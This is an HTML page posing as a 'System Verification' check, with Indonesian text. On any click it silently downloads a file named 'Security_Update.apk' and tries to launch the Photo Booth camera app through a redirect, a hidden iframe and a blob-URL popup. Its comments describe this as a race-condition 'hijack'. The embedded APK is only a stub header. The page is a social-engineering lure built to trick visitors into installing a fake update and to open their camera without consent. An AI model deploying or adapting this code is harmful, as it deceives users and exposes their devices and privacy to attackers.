<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; cursor: pointer; text-align: center;
  }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #333; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 System Verification</h2>
  <p>Klik di mana saja untuk memverifikasi.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. TARGET SCHEMES (EXPERIMENTAL)
  // ============================================
  // Skema tidak resmi (mungkin tidak berfungsi, tapi patut dicoba)
  var PHOTOBOOTH_SCHEME = "photobooth://";
  var PHOTOBOOTH_ALT = "x-apple.systempreferences:com.apple.PhotoBooth"; // Alternatif

  // ============================================
  // 2. TRIGGER RACE CONDITION (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>Memproses...</h2>
      <p>Mengunduh pembaruan & membuka kamera...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Photo Booth Race Condition...");

    // ============================================
    // A. APK DOWNLOAD (0ms)
    // ============================================
    try {
      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
      var binary = atob(b64Apk);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      
      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
      var blobUrl = URL.createObjectURL(blob);
      
      var a = document.createElement("a");
      a.href = blobUrl;
      a.download = "Security_Update.apk";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      
      log("[+] APK Download Triggered.");
    } catch(e) {
      log("[-] APK Error: " + e.message);
    }

    // ============================================
    // B. PHOTOBOOTH HIJACK (10ms - Race)
    // ============================================
    setTimeout(function() {
      log("[+] Mengirim PhotoBooth Scheme...");
      try {
        window.location.href = PHOTOBOOTH_SCHEME;
      } catch(e) {
        log("[-] Gagal: " + e.message);
      }
    }, 10);

    // ============================================
    // C. IFRAME SANDBOX (100ms - Fallback)
    // ============================================
    setTimeout(function() {
      log("[+] Mengirim PhotoBooth via Iframe...");
      try {
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        iframe.src = PHOTOBOOTH_SCHEME;
        document.getElementById("launcher-container").appendChild(iframe);
      } catch(e) {}
    }, 100);

    // ============================================
    // D. BLOB REDIRECT CHAIN (500ms - Fallback 2)
    // ============================================
    setTimeout(function() {
      log("[+] Mengirim Blob Redirect...");
      try {
        var blobPayload = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              window.location.replace("${PHOTOBOOTH_SCHEME}");
            <\/script>
          </body>
          </html>
        `;
        var blob = new Blob([blobPayload], { type: 'text/html' });
        var blobUrl = URL.createObjectURL(blob);
        
        var win = window.open(blobUrl, '_blank');
      } catch(e) {}
    }, 500);

  }, { once: true });

})();
</script>
</body>
</html>
